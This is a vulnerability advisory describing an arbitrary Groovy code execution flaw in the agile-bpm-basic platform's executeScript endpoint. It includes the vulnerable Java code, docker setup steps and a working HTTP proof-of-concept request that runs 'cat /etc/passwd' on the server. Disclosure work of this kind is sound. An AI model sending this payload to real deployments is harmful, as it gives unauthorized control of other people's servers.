# Vulnerability Description

The open source low-code rapid development platform "[agile-bpm/agile-bpm-basic](https://gitee.com/agile-bpm/agile-bpm-basic)" has a code execution vulnerability that allows attackers to execute arbitrary Groovy scripts to gain full control of the victim's server.

- Vulnerability Discloser: [Honor Cyber Security Lab](https://github.com/honorseclab)
  
- Vendors: [www.tongzhouyun.com](https://www.tongzhouyun.com/)
  
- Source code address： [agile-bpm/agile-bpm-basic](https://gitee.com/agile-bpm/agile-bpm-basic)
  

Related reports online link:

- [https://gitee.com/agile-bpm/agile-bpm-basic/issues/ICAPT5](https://gitee.com/agile-bpm/agile-bpm-basic/issues/ICAPT5);
- [https://github.com/honorseclab/vulns/blob/main/AgileBPM_agile-bpm-basic/RCE.md](https://github.com/honorseclab/vulns/blob/main/AgileBPM_agile-bpm-basic/RCE.md);

Note:

- **This vulnerability was discovered automatically by my AI code audit tool**.
  
- The vulnerability is in the latest version code submitted as of 20250526, but the author has not synchronized the release version. According to the public Readme information, it is roughly judged to belong to version v2.8.
  

# Vulnerability Analysis

The vulnerability code entry point is located at：

- [https://gitee.com/agile-bpm/agile-bpm-basic/blob/master/ab-sys/ab-sys-core/src/main/java/com/dstz/sys/rest/controller/SysScriptController.java#L62](https://gitee.com/agile-bpm/agile-bpm-basic/blob/master/ab-sys/ab-sys-core/src/main/java/com/dstz/sys/rest/controller/SysScriptController.java#L62)

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
// ab-sys\ab-sys-core\src\main\java\com\dstz\sys\rest\controller\SysScriptController.java:executeScript
    @RequestMapping(value = "executeScript", produces = MediaType.APPLICATION_JSON_VALUE)
    public ApiResponse<Object> executeScript(@RequestParam("key") String name, @RequestParam("script") String script) {
        checkIsDemoEnvironment();
        Object retVal;
        try {
            // 执行结果
            retVal = groovyScriptEngine.evaluate(script, new HashMap<>(0));
        } catch (Exception e) {
            logger.warn("执行脚本出错, 脚本名称：{}, 脚本: {}", name, script, e);
            retVal = String.format("执行脚本出错, %s", e.getMessage());
        }
        return ApiResponse.success(retVal);
    }

// ab-component\ab-groovy-script-engine\src\main\java\com\dstz\groovy\script\engine\GroovyScriptEngine.java:evaluate
    @SuppressWarnings("unchecked")
    @Override
    public <T> T evaluate(String script, Map<String, Object> vars) {
        if (CharSequenceUtil.isBlank(script)) {
            return null;
        }
        script = stringEscape.replace(script).toString();
        if (logger.isDebugEnabled()) {
            logger.debug("执行:{}", script);
            logger.debug("variables:{}", ObjectUtil.toString(vars));
        }
        try {
            groovyBinding.setThreadVariables(vars);
            GroovyShell shell = groovyShellCache.get(DigestUtils.md5DigestAsHex(script.getBytes(StandardCharsets.UTF_8)), () -> new AbGroovyShell(groovyBinding));
            T result = (T)shell.evaluate(script);
            if (logger.isDebugEnabled()) {
                logger.debug("result:{}", result);
            }
            return result;
        } catch (ExecutionException ex) {
            throw new GroovyEngineEvaluateException(ex.getMessage(), ex, script);
        }finally {
            groovyBinding.clearVariables();
        }
    }

// ab-base\ab-base-web\src\main\java\com\dstz\base\web\controller\AbCrudController.java
    protected void checkIsDemoEnvironment() {
        if("demoa5.tongzhouyun.com".equals(AbRequestUtils.getHttpServletRequest().getServerName())) {
             throw new BusinessException(GlobalApiCodes.REMOTE_CALL_ERROR.formatDefaultMessage("演示环境禁止当前操作，访问信息已经被统计！"));
        }
    }
```

As you can see, the external API ("/executeScript") receives the value of the externally controllable string variable "script" and passes it directly to the "groovy.lang.GroovyShell:evaluate" function for script execution without any verification. This constitutes a complete arbitrary code execution vulnerability, which can be used by attackers to gain control of the victim's server.

In addition, although the author added the "checkIsDemoEnvironment" function to restrict API access, it only restricts the access of requests corresponding to the demonstration environment domain name, and any other user who deploys this open source project code will be threatened by this vulnerability.

# Vulnerability Verification

Please first build the project local environment according to the steps provided by the project source code author in the Readme file. The easiest way is to deploy the environment through containers, which only requires the following two commands:

```shell
docker pull registry.cn-hangzhou.aliyuncs.com/agilebpm/agile-bpm-basic:latest
docker run --name agile-bpm-basic -p 80:80 registry.cn-hangzhou.aliyuncs.com/agilebpm/agile-bpm-basic:latest
```

Then visit the login page through http://ip:80, log in with the default account and password, and obtain a valid "Authorization" request header.

The vulnerability proof of concept (POC) is as follows:

```js
GET /api/ab-bpm/sys/script/executeScript?key=hello&script=%22cat%20/etc/passwd%22.execute().text HTTP/1.1
Host: 192.168.190.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
Authorization: Bearer XNJ_yTo3yvv9U5ah6R5TKgcAQYs
Content-Length: 0
Origin: http://192.168.190.132
Connection: keep-alive
Referer: http://192.168.190.132/sys/scripts/scriptList
Priority: u=0
```

After I deployed this project on my Ubuntu virtual machine, I successfully executed the "cat /etc/passwd" command by accessing the API and verified this vulnerability, as shown in the following picture.

![imagepng](https://cdn.nlark.com/yuque/0/2025/png/21744475/1748262984719-ea67f2c9-8c9c-49ab-b3aa-ed164be25386.png?x-oss-process=image%2Fformat%2Cwebp)

# Security Suggestions

Verify the legitimacy of the script to be executed to prevent arbitrary code execution from causing the server to be controlled by attackers.
